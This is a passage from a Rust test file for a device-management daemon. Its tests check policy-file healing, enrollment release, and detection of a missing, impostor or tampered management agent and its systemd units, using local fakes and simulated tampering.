    *state.assignment.lock().unwrap() = Some("unusable");
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["enrolled"], true);
    assert_eq!(status["policy_ids"], json!([]));
    assert_eq!(
        status["policy"]["last_refresh"],
        json!({"at": status["enrolled_at"], "result": "held", "reason": "unusable_assignment"})
    );

    daemon.result("reconcile", None);
    assert!(
        policy_events(&daemon).is_empty(),
        "the same answer is no news"
    );
    state.serve_no_policy.store(false, Ordering::SeqCst);
    *state.assignment.lock().unwrap() = None;
    daemon.result("reconcile", None);
    assert_eq!(policy_d_files(&daemon), ["eng-baseline-v12.json"]);
    assert_eq!(last_refresh(&daemon)["result"], "applied");
}

/// The files are what the device enforces at its next start, so they are
/// what a refresh compares with, not the record of them: one that was
/// edited or removed is written again from the organization's set.
#[test]
fn a_policy_file_edited_or_removed_on_the_device_is_written_again() {
    let dir = test_dir("refresh-heal");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let bytes = policy_d_bytes(&daemon);
    let file = daemon.state_path("policy.d/eng-baseline-v12.json");

    let mut edited = read_json(&file);
    edited["policy"]["spec"]["security"]["firewall"]["enabled"] = json!(false);
    fs::write(&file, serde_json::to_vec_pretty(&edited).unwrap()).unwrap();
    daemon.result("reconcile", None);
    assert_eq!(policy_d_bytes(&daemon), bytes, "edited: written again");
    assert_eq!(last_refresh(&daemon)["result"], "applied");

    fs::remove_file(&file).unwrap();
    daemon.result("reconcile", None);
    assert_eq!(policy_d_bytes(&daemon), bytes, "removed: written again");
    assert_eq!(policy_events(&daemon).len(), 2);
}

// ---------------------------------------------------------------------------
// The built-in agent: dormant until enrolled, and every way it stops
// answering an enrolled device noticed and audited (docs/development/
// smplify-enrollment.md section 3.4; docs/api/ipc.md sections 5.10, 5.11, 6)
// ---------------------------------------------------------------------------

/// A device that never enrolled never calls the agent: not at boot, not on
/// any pass, not to answer a status read. With the agent's socket owned by
/// systemd, that is what keeps a personal device free of Smplify code.
#[test]
fn a_device_that_never_enrolled_never_calls_the_agent() {
    let dir = test_dir("personal-no-calls");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    for _ in 0..3 {
        daemon.result("reconcile", None);
    }
    daemon.result("enroll.status", None);
    daemon.result("status", None);
    assert!(
        control_plane.state.methods.lock().unwrap().is_empty(),
        "{:?}",
        control_plane.state.methods.lock().unwrap()
    );
    // Not even a connection without a call: that alone would start the
    // agent through its socket.
    assert_eq!(control_plane.state.connections.load(Ordering::SeqCst), 0);
    assert_eq!(daemon.status_summary()["management"], Value::Null);
}

/// Unenrolling asks the agent one thing, to wipe the identity, and once it
/// has confirmed that nothing is asked again: the agent goes dormant and the
/// device is personal.
#[test]
fn unenrolling_asks_the_agent_to_wipe_and_then_nothing() {
    let dir = test_dir("unenroll-calls");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let state = &control_plane.state;
    state.methods.lock().unwrap().clear();
    let stopped = daemon.result("enroll.stop", None);
    assert_eq!(stopped["identity_release"], "released");
    assert_eq!(*state.methods.lock().unwrap(), ["enroll.unregister"]);
    assert!(!daemon.state_path("device-token").exists());
    for _ in 0..2 {
        daemon.result("reconcile", None);
    }
    assert_eq!(state.methods.lock().unwrap().len(), 1, "nothing more");
    assert!(
        daemon
            .audit_events()
            .iter()
            .all(|e| e["action"] != "enroll.release"),
        "a release confirmed at once is the enroll.stop event's own"
    );
}

/// Every way the agent can stop serving an enrolled device is noticed within
/// one pass, told apart from the network, and audited once for the episode
/// with its reason, then once when it ends: an identity deleted from under it
/// (it answers that it holds none), one that is not this device's, an agent
/// killed mid-call, one that resets the connection, a socket that is gone
/// (masked and stopped) and one nobody listens on (failed). While it lasts
/// the reports are held and the status file says management is interrupted.
#[test]
fn every_way_the_agent_stops_serving_is_audited_once_per_episode() {
    let dir = test_dir("agent-faults");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let state = Arc::clone(&control_plane.state);
    let broken = |reason: &str| {
        let reports = state.compliance.lock().unwrap().len();
        for _ in 0..2 {
            daemon.result("reconcile", None);
        }
        let status = daemon.result("enroll.status", None);
        assert_eq!(status["management"]["state"], "interrupted", "{reason}");
        assert_eq!(status["management"]["reason"], reason, "{status}");
        assert!(status["management"]["since"].is_string(), "{status}");
        assert_eq!(daemon.status_summary()["management"], "interrupted");
        assert_eq!(
            state.compliance.lock().unwrap().len(),
            reports,
            "{reason}: reports are held"
        );
    };
    let mended = |reason: &str| {
        daemon.result("reconcile", None);
        let status = daemon.result("enroll.status", None);
        assert_eq!(status["management"], json!({"state": "active"}), "{reason}");
        assert_eq!(daemon.status_summary()["management"], "active");
        let events = agent_events(&daemon);
        assert_eq!(
            events[events.len() - 2..],
            [
                ("agent_unavailable".to_string(), format!("agent.{reason}")),
                ("success".to_string(), format!("agent.{reason}"))
            ],
            "{events:?}"
        );
    };

    for (flag, reason) in [
        (&state.forget_identity, "identity_missing"),
        (&state.other_identity, "identity_mismatch"),
        (&state.hang_up, "closed_without_answer"),
        (&state.reset, "connection_reset"),
    ] {
        flag.store(true, Ordering::SeqCst);
        broken(reason);
        flag.store(false, Ordering::SeqCst);
        mended(reason);
    }

    // Masked and stopped: no socket at all.
    let saved = control_plane.stop();
    broken("socket_missing");
    let control_plane = ControlPlane::start_with(&dir, Arc::clone(&saved));
    mended("socket_missing");

    // Failed: a socket node nobody listens on.
    let saved = control_plane.stop();
    drop(UnixListener::bind(dir.join("control-plane.sock")).unwrap());
    broken("connection_refused");
    let _control_plane = ControlPlane::start_with(&dir, saved);
    mended("connection_refused");

    assert_eq!(agent_events(&daemon).len(), 12, "two per episode, no more");
    // None of it was the network: no sync outage, no policy fetch recorded
    // as unreachable, and last_sync still names the last real sync.
    let events = daemon.audit_events();
    assert!(
        events.iter().all(|e| e["action"] != "enroll.sync"
            && !(e["action"] == "enroll.policy" && e["result"] == "unreachable")),
        "{events:?}"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["result"], "success", "{status}");
}

/// The liveness check fails closed: the one answer that means the agent is
/// there and is this device's is `enrolled: true` with `token_matches: true`.
/// Something else answering on the agent's socket, with an answer the agent
/// never gives, is management interrupted (`unexpected_answer`), not a pass
/// that learned nothing: a stand-in that claims an identity but not this
/// device's token, one that refuses with an error the agent never uses, one
/// that writes a line that is not the protocol, and one that speaks another
/// version of it.
#[test]
fn an_answer_that_is_not_the_agents_is_management_interrupted() {
    let dir = test_dir("agent-impostor");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let state = &control_plane.state;
    for raw in [
        r#"{"v":1,"id":"x","result":{"enrolled":true}}"#,
        r#"{"v":1,"id":"x","error":{"code":"x","message":"y"}}"#,
        r#"{"v":1,"id":"x","result":{}}"#,
        "not the protocol",
        r#"{"v":2,"id":"x","result":{"enrolled":true,"token_matches":true}}"#,
    ] {
        *state.raw_identity_status.lock().unwrap() = Some(raw.to_string());
        let reports = state.compliance.lock().unwrap().len();
        daemon.result("reconcile", None);
        let status = daemon.result("enroll.status", None);
        assert_eq!(status["management"]["state"], "interrupted", "{raw}");
        assert_eq!(
            status["management"]["reason"], "unexpected_answer",
            "{raw}: {status}"
        );
        assert_eq!(
            state.compliance.lock().unwrap().len(),
            reports,
            "{raw}: nothing more is sent to it"
        );
        *state.raw_identity_status.lock().unwrap() = None;
        daemon.result("reconcile", None);
        assert_eq!(
            daemon.result("enroll.status", None)["management"]["state"],
            "active",
            "{raw}"
        );
    }
    assert_eq!(
        agent_events(&daemon),
        [
            "agent_unavailable",
            "success",
            "agent_unavailable",
            "success",
            "agent_unavailable",
            "success",
            "agent_unavailable",
            "success",
            "agent_unavailable",
            "success"
        ]
        .iter()
        .map(|result| (result.to_string(), "agent.unexpected_answer".to_string()))
        .collect::<Vec<_>>()
    );
}

/// punard's own device token deleted while the device is enrolled: it can
/// neither ask the agent about this device's identity nor report on it, and
/// that is management interrupted (`token_missing`), audited once, never a
/// network outage. Nothing is sent: not even the liveness call, which would
/// have no token to present.
#[test]
fn a_deleted_device_token_is_management_interrupted() {
    let dir = test_dir("token-deleted");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    daemon.stop();
    fs::remove_file(dir.join("state/device-token")).unwrap();
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let before = control_plane.state.connections.load(Ordering::SeqCst);
    for _ in 0..2 {
        daemon.result("reconcile", None);
    }
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["management"]["state"], "interrupted", "{status}");
    assert_eq!(status["management"]["reason"], "token_missing", "{status}");
    assert_eq!(status["last_sync"]["pending"], true, "{status}");
    assert_eq!(daemon.status_summary()["management"], "interrupted");
    assert_eq!(
        agent_events(&daemon),
        [(
            "agent_unavailable".to_string(),
            "agent.token_missing".to_string()
        )]
    );
    assert!(
        daemon
            .audit_events()
            .iter()
            .all(|e| e["action"] != "enroll.sync"),
        "not the network"
    );
    assert_eq!(
        control_plane.state.connections.load(Ordering::SeqCst),
        before,
        "nothing asked without the token"
    );
}

/// An episode that began before a restart is the same episode after it: no
/// second `agent_unavailable` event for it, and its recovery is audited when
/// it ends.
#[test]
fn an_agent_episode_survives_a_restart() {
    let dir = test_dir("agent-restart");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    control_plane
        .state
        .forget_identity
        .store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    daemon.stop();
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result("reconcile", None);
    assert_eq!(
        agent_events(&daemon),
        [(
            "agent_unavailable".to_string(),
            "agent.identity_missing".to_string()
        )]
    );
    control_plane
        .state
        .forget_identity
        .store(false, Ordering::SeqCst);
    daemon.result("reconcile", None);
    assert_eq!(agent_events(&daemon).len(), 2);
    assert_eq!(agent_events(&daemon)[1].0, "success");
}

/// A registration enroll.start could not commit is released like an
/// unenrollment: when the agent does not confirm the wipe, the identity's
/// token is kept and says so, and a later pass finishes it, so the key is
/// never left on disk with nothing to remove it.
#[test]
fn an_uncommitted_registration_the_agent_does_not_release_is_released_later() {
    let dir = test_dir("uncommitted-release");
    let control_plane = ControlPlane::start(&dir);
    let state = &control_plane.state;
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    state.serve_bad_policy.store(true, Ordering::SeqCst);
    state.refuse_unregister.store(true, Ordering::SeqCst);
    daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(
        daemon.state_path("device-token").exists(),
        "kept to release"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["enrolled"], false);
    assert_eq!(
        status["identity_release"],
        json!({"state": "pending", "reason": "refused"})
    );
    assert_eq!(state.devices.lock().unwrap().len(), 1, "still held");
    assert!(
        daemon.state_path("identity-release.json").exists(),
        "the release is recorded, not inferred from the token"
    );
    // Still refused: asked again, not audited again, and shown in the
    // status file the shell reads.
    daemon.result("reconcile", None);
    assert_eq!(daemon.status_summary()["identity_release"], "pending");
    let releases = |daemon: &TestDaemon| -> Vec<(String, String)> {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "enroll.release")
            .map(|e| {
                (
                    e["result"].as_str().unwrap().to_string(),
                    e["resource"].as_str().unwrap().to_string(),
                )
            })
            .collect()
    };
    assert_eq!(
        releases(&daemon),
        [("pending".to_string(), "agent.refused".to_string())]
    );

    state.refuse_unregister.store(false, Ordering::SeqCst);
    daemon.result("reconcile", None);
    assert!(!daemon.state_path("device-token").exists());
    assert!(!daemon.state_path("identity-release.json").exists());
    assert!(state.devices.lock().unwrap().is_empty(), "released");
    assert!(
        daemon
            .result("enroll.status", None)
            .get("identity_release")
            .is_none()
    );
    assert_eq!(daemon.status_summary()["identity_release"], Value::Null);
    assert_eq!(
        releases(&daemon),
        [
            ("pending".to_string(), "agent.refused".to_string()),
            ("success".to_string(), "agent".to_string())
        ]
    );

    // And the device enrolls as it would have.
    state.serve_bad_policy.store(false, Ordering::SeqCst);
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
}

/// Deleting `enrollment.json` (and its terms) while the device token stays is
/// not an unenrollment: nothing ended the enrollment, so punard keeps the
/// organization's identity rather than wiping it itself, asks the agent
/// nothing, audits it once as `enroll.release` `kept`, and shows it. A new
/// enrollment replaces it.
#[test]
fn a_deleted_enrollment_record_keeps_the_identity_rather_than_releasing_it() {
    let dir = test_dir("record-deleted");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    daemon.stop();
    fs::remove_file(dir.join("state/enrollment.json")).unwrap();
    fs::remove_file(dir.join("state/enrollment-terms.json")).unwrap();
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let before = state.connections.load(Ordering::SeqCst);
    for _ in 0..2 {
        daemon.result("reconcile", None);
    }
    assert_eq!(
        state.connections.load(Ordering::SeqCst),
        before,
        "the agent is asked nothing"
    );
    assert_eq!(state.devices.lock().unwrap().len(), 1, "the identity stays");
    assert!(daemon.state_path("device-token").exists());
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["enrolled"], false);
    assert_eq!(
        status["identity_release"],
        json!({"state": "kept", "reason": "enrollment_record_missing"})
    );
    assert_eq!(daemon.status_summary()["identity_release"], "kept");
    let releases = |daemon: &TestDaemon| -> Vec<(String, String)> {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "enroll.release")
            .map(|e| {
                (
                    e["result"].as_str().unwrap().to_string(),
                    e["resource"].as_str().unwrap().to_string(),
                )
            })
            .collect()
    };
    let kept = [(
        "kept".to_string(),
        "agent.enrollment_record_missing".to_string(),
    )];
    assert_eq!(releases(&daemon), kept);
    // A restart is the same decision, not a second one.
    daemon.stop();
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result("reconcile", None);
    assert_eq!(releases(&daemon), kept);
    assert_eq!(state.devices.lock().unwrap().len(), 1);

    // A new enrollment replaces it, and nothing is left to keep (the
    // organization's file the old record owned is now a foreign one, which
    // enrollment never overwrites: removed first, as its refusal says).
    fs::remove_file(dir.join("state/policy.d/eng-baseline-v12.json")).unwrap();
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert!(!daemon.state_path("identity-release.json").exists());
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["enrolled"], true);
    assert!(status.get("identity_release").is_none(), "{status}");
}

/// enroll.start records the release before it registers, so a registration
/// whose answer never reached punard (killed, powered off, a broken
/// connection) is not left with the agent: punard has no token and no
/// enrollment, the record says to release, and the next pass asks the agent
/// to wipe whatever it holds. A registration that commits removes the
/// record.
#[test]
fn a_registration_whose_answer_was_lost_is_released_later() {
    let dir = test_dir("registration-lost");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    *state.release_record.lock().unwrap() = Some(dir.join("state/identity-release.json"));
    let daemon = enrolled(&dir, &control_plane, "enabled");
    assert_eq!(*state.record_before_register.lock().unwrap(), [true]);
    assert!(!daemon.state_path("identity-release.json").exists());

    // punard dies after the agent kept the identity and before punard kept
    // anything of it: only the record enroll.start wrote before registering.
    daemon.stop();
    for file in ["enrollment.json", "enrollment-terms.json", "device-token"] {
        fs::remove_file(dir.join("state").join(file)).unwrap();
    }
    fs::write(
        dir.join("state/identity-release.json"),
        r#"{"version":1,"state":"release","cause":"registration","since":"2026-09-25T00:00:00Z"}"#,
    )
    .unwrap();
    assert_eq!(state.devices.lock().unwrap().len(), 1);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result("reconcile", None);
    assert!(state.devices.lock().unwrap().is_empty(), "released");
    let asked = state.unregisters.lock().unwrap().last().cloned().unwrap();
    assert_eq!(asked, json!({"any_identity": true}), "no token to present");
    assert!(!daemon.state_path("identity-release.json").exists());
    assert!(
        daemon
            .result("enroll.status", None)
            .get("identity_release")
            .is_none()
    );
    assert!(
        daemon
            .audit_events()
            .iter()
            .any(|e| e["action"] == "enroll.release" && e["result"] == "success")
    );
}

/// An unenrollment whose agent holds an identity the token does not name (one
/// planted, or left by a registration punard never heard back from) still
/// finishes: punard, holding no enrollment, asks for whatever the agent holds
/// to go, and it goes, rather than being refused on every pass forever.
#[test]
fn a_release_the_token_does_not_name_is_not_refused_forever() {
    let dir = test_dir("release-mismatch");
    let control_plane = ControlPlane::start(&dir);
    let state = Arc::clone(&control_plane.state);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    state.refuse_unregister.store(true, Ordering::SeqCst);
    let stopped = daemon.result("enroll.stop", None);
    assert_eq!(stopped["identity_release"], "pending");
    // The agent now holds an identity the kept token does not name.
    state.devices.lock().unwrap().clear();
    state
        .devices
        .lock()
        .unwrap()
        .insert("tok_planted".to_string(), "dev_planted".to_string());
    state.refuse_unregister.store(false, Ordering::SeqCst);
    daemon.result("reconcile", None);
    assert!(state.devices.lock().unwrap().is_empty(), "wiped");
    let asked = state.unregisters.lock().unwrap().last().cloned().unwrap();
    assert_eq!(asked["any_identity"], true, "{asked}");
    assert!(!daemon.state_path("device-token").exists());
    assert!(!daemon.state_path("identity-release.json").exists());
}

/// An episode of management interrupted still open when the enrollment ends
/// is closed by it: one `enroll.agent` `ended` event, so every episode in the
/// audit has both ends.
#[test]
fn an_episode_open_at_unenrollment_is_closed_by_it() {
    let dir = test_dir("episode-at-stop");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    control_plane
        .state
        .forget_identity
        .store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    daemon.result("enroll.stop", None);
    assert_eq!(
        agent_events(&daemon),
        [
            (
                "agent_unavailable".to_string(),
                "agent.identity_missing".to_string()
            ),
            ("ended".to_string(), "agent.identity_missing".to_string())
        ]
    );
}

// ---------------------------------------------------------------------------
// The management units, the agent's listener, and the passes themselves
// ---------------------------------------------------------------------------

/// What systemd shows for the management units as the image ships them,
/// the agent running as process 4242.
fn shipped_units() -> String {
    "Id=punar-smplifyd.socket\nLoadState=loaded\n\
     FragmentPath=/usr/lib/systemd/system/punar-smplifyd.socket\nDropInPaths=\n\
     Listen=/run/punar-smplifyd/api.sock (Stream)\n\n\
     MainPID=4242\nId=punar-smplifyd.service\nLoadState=loaded\n\
     FragmentPath=/usr/lib/systemd/system/punar-smplifyd.service\nDropInPaths=\n\n\
     MainPID=812\nId=punard.service\nLoadState=loaded\n\
     FragmentPath=/usr/lib/systemd/system/punard.service\nDropInPaths=\n\n\
     Id=punard-reconcile.timer\nLoadState=loaded\n\
     FragmentPath=/usr/lib/systemd/system/punard-reconcile.timer\nDropInPaths=\n\n\
     MainPID=0\nId=punard-reconcile.service\nLoadState=loaded\n\
     FragmentPath=/usr/lib/systemd/system/punard-reconcile.service\nDropInPaths=\n"
        .to_string()
}

/// A stand-in for `systemctl` in `dir/units`: `show` prints `shown.txt`,
/// `start` appends its arguments to `started.txt`; and a /proc where process
/// 4242 runs the image's agent.
fn fake_systemctl(dir: &Path, require_systemd_listener: bool) -> AgentIntegrity {
    let units = dir.join("units");
    fs::create_dir_all(units.join("proc/4242")).unwrap();
    fs::write(units.join("shown.txt"), shipped_units()).unwrap();
    std::os::unix::fs::symlink(AGENT_EXECUTABLE, units.join("proc/4242/exe")).unwrap();
    let systemctl = units.join("systemctl");
    fs::write(
        &systemctl,
        "#!/bin/sh\nhere=$(dirname \"$0\")\ncase \"$1\" in\n\
         show) cat \"${here}/shown.txt\" ;;\n\
         start) echo \"$*\" >> \"${here}/started.txt\" ;;\nesac\n",
    )
    .unwrap();
    fs::set_permissions(&systemctl, fs::Permissions::from_mode(0o755)).unwrap();
    AgentIntegrity {
        systemctl,
        proc_root: units.join("proc"),
        require_systemd_listener,
    }
}

fn with_integrity(
    dir: &Path,
    control_plane: &ControlPlane,
    integrity: AgentIntegrity,
) -> TestDaemon {
    TestDaemon::start_with(
        dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        Vec::new(),
        move |cfg| cfg.agent_integrity = Some(integrity),
    )
}

/// An agent that answers as this device's, behind units that are not the
/// image's, is management interrupted (`unit_modified`), once per episode:
/// a drop-in on punard pointing it elsewhere, a drop-in replacing the
/// agent's `ExecStart=`, a masked reconcile timer, a socket listening
/// elsewhere, and an agent process that is not the image's binary.
#[test]
fn a_modified_management_unit_is_management_interrupted() {
    let dir = test_dir("units-modified");
    let control_plane = ControlPlane::start(&dir);
    let daemon = with_integrity(&dir, &control_plane, fake_systemctl(&dir, false));
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    daemon.result("reconcile", None);
    assert_eq!(
        daemon.result("enroll.status", None)["management"]["state"],
        "active"
    );
    let shown = dir.join("units/shown.txt");
    let exe = dir.join("units/proc/4242/exe");
    let modifications: [(&str, &dyn Fn()); 5] = [
        ("punard re-routed", &|| {
            fs::write(
                &shown,
                shipped_units().replace(
                    "punard.service\nDropInPaths=",
                    "punard.service\nDropInPaths=/etc/systemd/system/punard.service.d/route.conf",
                ),
            )
            .unwrap()
        }),
        ("agent replaced", &|| {
            fs::write(
                &shown,
                shipped_units().replace(
                    "punar-smplifyd.service\nDropInPaths=",
                    "punar-smplifyd.service\nDropInPaths=/run/systemd/system/punar-smplifyd.service.d/exec.conf",
                ),
            )
            .unwrap()
        }),
        ("timer masked", &|| {
            fs::write(
                &shown,
                shipped_units().replace(
                    "Id=punard-reconcile.timer\nLoadState=loaded",
                    "Id=punard-reconcile.timer\nLoadState=masked",
                ),
            )
            .unwrap()
        }),
        ("socket moved", &|| {
            fs::write(
                &shown,
                shipped_units().replace("punar-smplifyd/api.sock", "x/api.sock"),
            )
            .unwrap()
        }),
        ("another binary", &|| {
            fs::remove_file(&exe).unwrap();
            std::os::unix::fs::symlink("/tmp/impostor", &exe).unwrap();
        }),
    ];
    for (what, modify) in modifications {
        modify();
        daemon.result("reconcile", None);
        let status = daemon.result("enroll.status", None);
        assert_eq!(status["management"]["state"], "interrupted", "{what}");
        assert_eq!(status["management"]["reason"], "unit_modified", "{what}");
        fs::write(&shown, shipped_units()).unwrap();
        fs::remove_file(&exe).unwrap();
        std::os::unix::fs::symlink(AGENT_EXECUTABLE, &exe).unwrap();
        daemon.result("reconcile", None);
        assert_eq!(
            daemon.result("enroll.status", None)["management"]["state"],
            "active",
            "{what}"
        );
    }
    assert_eq!(
        agent_events(&daemon),
        ["agent_unavailable", "success"]
            .repeat(5)
            .iter()
            .map(|result| (result.to_string(), "agent.unit_modified".to_string()))
            .collect::<Vec<_>>()
    );
}

/// A second socket unit at the agent's path, which leaves the agent's own
/// units exactly as shipped and whose listener systemd creates too (PID 1's
/// credentials, the agent's address), is management interrupted
/// (`unexpected_listener`); so is a systemd that cannot be asked about the
/// units (`units_unreadable`): what punard cannot see it does not vouch for.
/// Each ends when the units are as shipped again.
#[test]
fn another_listener_at_the_agents_path_or_units_unseen_is_management_interrupted() {
    let dir = test_dir("units-foreign-listener");
    let control_plane = ControlPlane::start(&dir);
    let daemon = with_integrity(&dir, &control_plane, fake_systemctl(&dir, false));
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    daemon.result("reconcile", None);
    assert_eq!(
        daemon.result("enroll.status", None)["management"]["state"],
        "active"
    );
    let shown = dir.join("units/shown.txt");
    let systemctl = dir.join("units/systemctl");
    let original = fs::read_to_string(&systemctl).unwrap();
    let cases: [(&str, &dyn Fn()); 2] = [
        ("unexpected_listener", &|| {
            fs::write(
                &shown,
                format!(
                    "{}\nListen=/run/punar-smplifyd/api.sock (Stream)\n\
                     Id=transient-fake.socket\nLoadState=loaded\n\
                     FragmentPath=/run/systemd/transient/transient-fake.socket\n\
                     DropInPaths=\n",
                    shipped_units()
                ),
            )
            .unwrap()
        }),
        ("units_unreadable", &|| {
            fs::write(
                &systemctl,
                "#!/bin/sh\necho 'Failed to connect to bus' >&2\nexit 1\n",
            )
            .unwrap()
        }),
    ];
    for (reason, break_it) in cases {
        break_it();
        daemon.result("reconcile", None);
        let status = daemon.result("enroll.status", None);
        assert_eq!(status["management"]["state"], "interrupted", "{reason}");
        assert_eq!(status["management"]["reason"], reason);
        fs::write(&shown, shipped_units()).unwrap();
        fs::write(&systemctl, &original).unwrap();
        daemon.result("reconcile", None);
        assert_eq!(
            daemon.result("enroll.status", None)["management"]["state"],
            "active",
            "{reason}"
        );
    }
    let expected: Vec<(String, String)> = ["unexpected_listener", "units_unreadable"]
        .iter()
        .flat_map(|reason| {
            ["agent_unavailable", "success"]
                .map(|result| (result.to_string(), format!("agent.{reason}")))
        })
        .collect();
    assert_eq!(agent_events(&daemon), expected);
}

/// Nothing, the enrollment code least of all, goes to an agent behind
/// modified units, or over a socket systemd did not create.
#[test]
fn enrollment_sends_nothing_to_an_agent_it_cannot_vouch_for() {
    let dir = test_dir("enroll-modified");
    let control_plane = ControlPlane::start(&dir);
    let integrity = fake_systemctl(&dir, false);
    fs::write(
        dir.join("units/shown.txt"),
        shipped_units().replace(
            "punar-smplifyd.service\nDropInPaths=",
            "punar-smplifyd.service\nDropInPaths=/etc/systemd/system/punar-smplifyd.service.d/x.conf",
        ),
    )
    .unwrap();
    let daemon = with_integrity(&dir, &control_plane, integrity);
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "code": "ENROLL-CODE"})),
    );
    assert_eq!(error["details"]["agent"], "unit_modified", "{error}");
    assert_eq!(control_plane.state.connections.load(Ordering::SeqCst), 0);
    daemon.stop();

    // Units as shipped, and a listener some other program bound (the test's
    // own): refused on the first connection, with nothing sent over it.
    fs::write(dir.join("units/shown.txt"), shipped_units()).unwrap();
    let integrity = AgentIntegrity {
        require_systemd_listener: true,
        ..fake_systemctl(&test_dir("enroll-listener"), false)
    };
    let daemon = with_integrity(&dir, &control_plane, integrity);
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "code": "ENROLL-CODE"})),
    );
    assert_eq!(error["details"]["agent"], "unexpected_listener", "{error}");
    assert!(control_plane.state.methods.lock().unwrap().is_empty());
    assert!(!daemon.state_path("enrollment.json").exists());
}

/// A socket that is gone or no longer listened on is started again: punard's
/// `Wants=` on it acts only when punard itself starts, so without this a
/// socket stopped once stayed stopped until a reboot.
#[test]
fn a_socket_that_stopped_listening_is_started_again() {
    let dir = test_dir("socket-restart");
    let control_plane = ControlPlane::start(&dir);
    let daemon = with_integrity(&dir, &control_plane, fake_systemctl(&dir, false));
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert!(!dir.join("units/started.txt").exists());
    let _saved = control_plane.stop();
    daemon.result("reconcile", None);
    assert_eq!(
        fs::read_to_string(dir.join("units/started.txt")).unwrap(),
        "start --no-block punar-smplifyd.socket\n"
    );
}

/// Passes further apart than the timer allows, suspend excluded, are audited
/// once when they resume (`enroll.gap`): on the same boot, and, when the gap
/// ended in a clean stop, on the next.
#[test]
fn a_gap_in_the_reconcile_passes_is_audited_when_they_resume() {
    const LIMIT: Duration = Duration::from_millis(300);
    let dir = test_dir("reconcile-gap");
    let control_plane = ControlPlane::start(&dir);
    let boot_id = dir.join("boot_id");
    fs::write(&boot_id, "boot-a\n").unwrap();
    let start = |boot_id: PathBuf| {
        TestDaemon::start_with(
            &dir,
            Peer::root(),
            &control_plane.socket,
            "enabled",
            Vec::new(),
            move |cfg| {
                cfg.boot_id_path = boot_id;
                cfg.reconcile_gap_limit = LIMIT;
            },
        )
    };
    let gaps = |daemon: &TestDaemon| {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "enroll.gap")
            .count()
    };
    let daemon = start(boot_id.clone());
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    daemon.result("reconcile", None);
    assert_eq!(gaps(&daemon), 0);
    std::thread::sleep(LIMIT * 2);
    daemon.result("reconcile", None);
    assert_eq!(gaps(&daemon), 1);
    daemon.result("reconcile", None);
    assert_eq!(gaps(&daemon), 1, "once, when passes resume");

    // No pass for a while, then a clean stop, then another boot.
    std::thread::sleep(LIMIT * 2);
    daemon.stop();
    fs::write(&boot_id, "boot-b\n").unwrap();
    let daemon = start(boot_id.clone());
    assert_eq!(gaps(&daemon), 2, "measured to the clean stop");
    daemon.result("reconcile", None);
    assert_eq!(gaps(&daemon), 2);
}

/// An override of the control-plane socket refused on an image with no
/// development control plane is audited once at start.
#[test]
fn a_refused_control_plane_override_is_audited() {
    let dir = test_dir("override-refused");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start_with(
        &dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        Vec::new(),
        |cfg| cfg.control_plane_override_refused = true,
    );
    assert_eq!(
        agent_events(&daemon),
        [(
            "denied".to_string(),
            "agent.control_plane_override".to_string()
        )]
    );
}

/// The audit trail's view of a capability's compliance survives a restart:
/// a capability recorded `non_compliant` that a restarted punard finds
/// healed is recorded `compliant` on its first pass, once.
#[test]
fn a_compliance_recovery_across_a_restart_is_audited() {
    let dir = test_dir("compliance-restart");
    let control_plane = ControlPlane::start(&dir);
    let changes = |daemon: &TestDaemon| -> Vec<String> {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "reconcile.compliance")
            .map(|e| e["result"].as_str().unwrap().to_string())
            .collect()
    };
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
